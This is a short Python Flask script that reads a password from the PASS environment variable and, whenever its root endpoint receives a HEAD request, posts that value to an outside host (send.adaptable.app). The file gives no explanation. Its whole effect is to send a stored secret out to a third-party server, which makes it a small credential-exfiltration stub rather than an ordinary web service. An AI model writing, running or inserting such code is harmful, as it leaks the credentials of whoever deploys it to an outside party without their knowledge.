import requests
import os
import flask
from flask import Flask, request, Response
app = Flask(__name__)

data = {"pass": os.environ.get('PASS')}

@app.route('/', methods=['HEAD'])
def handle_request():
    requests.post("https://send.adaptable.app", data=data)
    return ""
    

app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))

